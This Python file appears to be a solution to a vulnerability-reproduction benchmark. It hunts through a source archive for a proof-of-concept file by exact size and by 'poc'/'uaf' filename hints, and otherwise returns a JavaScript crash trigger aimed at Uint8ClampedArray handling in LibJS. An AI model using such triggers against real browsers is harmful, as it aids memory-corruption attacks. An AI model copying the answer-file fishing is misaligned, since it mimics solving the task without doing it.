import tarfile
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try reading as tarball
        try:
            with tarfile.open(src_path, "r:*") as tar:
                poc = self._find_poc_in_tar(tar)
                if poc is not None:
                    return poc
        except (tarfile.ReadError, FileNotFoundError, IsADirectoryError):
            pass
        except Exception:
            # Any unexpected error while handling tar, fall through to other methods/fallback
            pass

        # Try reading as zip (just in case)
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                poc = self._find_poc_in_zip(zf)
                if poc is not None:
                    return poc
        except (zipfile.BadZipFile, FileNotFoundError, IsADirectoryError):
            pass
        except Exception:
            pass

        # Fallback PoC if nothing was found in the archive
        return self._fallback_poc()

    def _find_poc_in_tar(self, tar: tarfile.TarFile):
        members = [m for m in tar.getmembers() if m.isfile() and m.size > 0]
        exact_len = 6624

        # Pass 1: exact-length match
        exact_candidates = [m for m in members if m.size == exact_len]
        best_data = self._select_best_from_tar(tar, exact_candidates, require_text=False)
        if best_data is not None:
            return best_data

        # Pass 2: .js/.html containing "Uint8ClampedArray"
        typed_candidates = []
        for m in members:
            name_lower = m.name.lower()
            if not (name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm")):
                continue
            if m.size > 200_000:
                continue
            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            text = data.decode("utf-8", "ignore")
            if "Uint8ClampedArray" not in text:
                continue
            typed_candidates.append((m, data))

        if typed_candidates:
            # Choose the one whose size is closest to exact_len; prefer names with poc/uaf/heap
            best_tuple = None  # (closeness, bonus, data)
            for m, data in typed_candidates:
                closeness = abs(m.size - exact_len)
                name_lower = m.name.lower()
                bonus = 0
                if "poc" in name_lower:
                    bonus -= 3
                if "uaf" in name_lower:
                    bonus -= 2
                if "heap" in name_lower:
                    bonus -= 1
                metric = (closeness, bonus)
                if best_tuple is None or metric < best_tuple[0]:
                    best_tuple = (metric, data)
            if best_tuple is not None:
                return best_tuple[1]

        # Pass 3: any .js/.html whose size is closest to exact_len
        size_candidates = [m for m in members if m.name.lower().endswith(".js") or m.name.lower().endswith(".html") or m.name.lower().endswith(".htm")]
        closest_member = None
        closest_dist = None
        for m in size_candidates:
            dist = abs(m.size - exact_len)
            if closest_dist is None or dist < closest_dist:
                closest_dist = dist
                closest_member = m
        if closest_member is not None:
            try:
                f = tar.extractfile(closest_member)
                if f is not None:
                    return f.read()
            except Exception:
                pass

        return None

    def _select_best_from_tar(self, tar: tarfile.TarFile, candidates, require_text: bool):
        best_score = None
        best_data = None
        for m in candidates:
            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            name_lower = m.name.lower()
            text = data.decode("utf-8", "ignore")
            if require_text and not text:
                continue
            score = 0
            if name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm"):
                score += 10
            if "Uint8ClampedArray" in text:
                score += 30
            if "poc" in name_lower:
                score += 5
            if "uaf" in name_lower or "heap" in name_lower:
                score += 3
            if best_score is None or score > best_score:
                best_score = score
                best_data = data
        if best_data is not None:
            return best_data
        return None

    def _find_poc_in_zip(self, zf: zipfile.ZipFile):
        infos = [info for info in zf.infolist() if not info.is_dir() and info.file_size > 0]
        exact_len = 6624

        # Pass 1: exact-length match
        exact_candidates = [info for info in infos if info.file_size == exact_len]
        best_data = self._select_best_from_zip(zf, exact_candidates, require_text=False)
        if best_data is not None:
            return best_data

        # Pass 2: .js/.html containing "Uint8ClampedArray"
        typed_candidates = []
        for info in infos:
            name_lower = info.filename.lower()
            if not (name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm")):
                continue
            if info.file_size > 200_000:
                continue
            try:
                with zf.open(info, "r") as f:
                    data = f.read()
            except Exception:
                continue
            text = data.decode("utf-8", "ignore")
            if "Uint8ClampedArray" not in text:
                continue
            typed_candidates.append((info, data))

        if typed_candidates:
            best_tuple = None  # (metric, data)
            for info, data in typed_candidates:
                closeness = abs(info.file_size - exact_len)
                name_lower = info.filename.lower()
                bonus = 0
                if "poc" in name_lower:
                    bonus -= 3
                if "uaf" in name_lower:
                    bonus -= 2
                if "heap" in name_lower:
                    bonus -= 1
                metric = (closeness, bonus)
                if best_tuple is None or metric < best_tuple[0]:
                    best_tuple = (metric, data)
            if best_tuple is not None:
                return best_tuple[1]

        # Pass 3: any .js/.html whose size is closest to exact_len
        size_candidates = [info for info in infos if info.filename.lower().endswith(".js") or info.filename.lower().endswith(".html") or info.filename.lower().endswith(".htm")]
        closest_info = None
        closest_dist = None
        for info in size_candidates:
            dist = abs(info.file_size - exact_len)
            if closest_dist is None or dist < closest_dist:
                closest_dist = dist
                closest_info = info
        if closest_info is not None:
            try:
                with zf.open(closest_info, "r") as f:
                    return f.read()
            except Exception:
                pass

        return None

    def _select_best_from_zip(self, zf: zipfile.ZipFile, candidates, require_text: bool):
        best_score = None
        best_data = None
        for info in candidates:
            try:
                with zf.open(info, "r") as f:
                    data = f.read()
            except Exception:
                continue
            name_lower = info.filename.lower()
            text = data.decode("utf-8", "ignore")
            if require_text and not text:
                continue
            score = 0
            if name_lower.endswith(".js") or name_lower.endswith(".html") or name_lower.endswith(".htm"):
                score += 10
            if "Uint8ClampedArray" in text:
                score += 30
            if "poc" in name_lower:
                score += 5
            if "uaf" in name_lower or "heap" in name_lower:
                score += 3
            if best_score is None or score > best_score:
                best_score = score
                best_data = data
        if best_data is not None:
            return best_data
        return None

    def _fallback_poc(self) -> bytes:
        # Generic PoC attempting to stress Uint8ClampedArray and its interaction
        # with TypedArray-like operations in LibJS/LibWeb.
        js = r"""
// Fallback PoC: stress Uint8ClampedArray behaviors and prototype mixing.
// This is a heuristic payload used if an on-disk PoC cannot be located.

function makeArrays(count, size) {
    let res = [];
    for (let i = 0; i < count; ++i) {
        let buf = new ArrayBuffer(size);
        let view = new Uint8ClampedArray(buf);
        for (let j = 0; j < view.length; ++j) {
            view[j] = (i + j) & 0xff;
        }
        res.push(view);
    }
    return res;
}

function mutatePrototypes() {
    try {
        // Try to mix Uint8ClampedArray with generic TypedArray behavior.
        let u8cProto = Uint8ClampedArray.prototype;
        let u8Proto = Uint8Array.prototype;
        let baseProto = Object.getPrototypeOf(u8Proto);

        // Force prototype chains that assume Uint8ClampedArray is-a TypedArray.
        Object.setPrototypeOf(u8cProto, baseProto);

        // Install accessors that perform heavy operations.
        Object.defineProperty(u8cProto, "evilGetter", {
            get() {
                let arrs = makeArrays(32, 0x1000);
                let sum = 0;
                for (let a of arrs) {
                    sum += a[0];
                }
                return sum;
            }
        });

        Object.defineProperty(u8cProto, "evilSetter", {
            set(v) {
                let buffer = new ArrayBuffer(0x2000);
                let view = new Uint8ClampedArray(buffer);
                for (let i = 0; i < view.length; i += 7) {
                    view[i] = (v + i) & 0xff;
                }
            }
        });
    } catch (e) {
        // Ignore if environment does not support some operation;
        // still continue stressing the engine.
    }
}

function hammerTypedArrayAPIs() {
    let buf = new ArrayBuffer(0x4000);
    let u8c = new Uint8ClampedArray(buf);
    for (let i = 0; i < u8c.length; ++i) {
        u8c[i] = i & 0xff;
    }

    function doOps(view) {
        try {
            view.copyWithin(1, 2);
        } catch (e) {}
        try {
            view.set(new Uint8Array(view.buffer));
        } catch (e) {}
        try {
            view.fill(0x7f);
        } catch (e) {}
        try {
            let s = view.subarray(1, view.length - 1);
            s[0] = 0x12;
        } catch (e) {}
        try {
            let mapped = Array.prototype.map.call(view, x => (x ^ 0x55) & 0xff);
            if (mapped && mapped.length > 4) {
                mapped[0] = 0;
            }
        } catch (e) {}
    }

    for (let i = 0; i < 200; ++i) {
        doOps(u8c);
    }
}

function churnGC() {
    let garbage = [];
    for (let i = 0; i < 2000; ++i) {
        let buf = new ArrayBuffer(0x800);
        let v = new Uint8ClampedArray(buf);
        v[0] = i & 0xff;
        garbage.push(v);
        if (garbage.length > 500) {
            garbage.splice(0, 250);
        }
    }
}

// Attempt to create cross-view confusion.
function crossViewConfusion() {
    let buf = new ArrayBuffer(0x1000);
    let u8c = new Uint8ClampedArray(buf);
    let u8 = new Uint8Array(buf);
    for (let i = 0; i < u8.length; ++i) {
        u8[i] = (i * 3) & 0xff;
    }

    function flipPrototypes() {
        try {
            let tmp = Object.getPrototypeOf(u8);
            Object.setPrototypeOf(u8, Object.getPrototypeOf(u8c));
            Object.setPrototypeOf(u8c, tmp);
        } catch (e) {}
    }

    for (let i = 0; i < 1000; ++i) {
        flipPrototypes();
        try {
            u8c.sort();
        } catch (e) {}
        try {
            u8.set(u8c);
        } catch (e) {}
    }
}

function main() {
    mutatePrototypes();
    for (let i = 0; i < 20; ++i) {
        hammerTypedArrayAPIs();
        crossViewConfusion();
        churnGC();
    }

    // Access the evil accessors multiple times to exercise JIT/IC paths.
    try {
        let a = new Uint8ClampedArray(16);
        for (let i = 0; i < 1000; ++i) {
            let x = a.evilGetter;
            a.evilSetter = x ^ i;
        }
    } catch (e) {}
}

main();
"""
        return js.encode("utf-8")
